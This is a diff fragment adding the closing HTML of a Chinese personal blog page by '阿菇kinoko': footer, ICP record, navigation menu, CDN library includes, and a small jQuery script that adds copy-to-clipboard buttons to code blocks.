+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    <div class="footer-cnrecord">
+      <img id="gongan" alt class="gongan-logo"
+          src="/images/gongan.png" />
+      浙ICP备2023028448号-2
+    </div>
+    <div class="footer-copyright">
+      Copyright &copy;
+      
+      
+      2022-2025
+      阿菇kinoko
+    </div>
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">📄首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">📂归档</a></li><!--
+     --><!--
+       --><li><a href="/friends/">👫友链</a></li><!--
+     --><!--
+       --><li><a href="/categories/">🗂️分类</a></li><!--
+     --><!--
+       --><li><a href="/tags/">🏷️标签</a></li><!--
+     --><!--
+       --><li><a href="/about/">🌸关于</a></li><!--
+     --><!--
+       --><li><a href="/log/">📖日志</a></li><!--
+     --><!--
+       --><li><a href="/search/">🔍搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
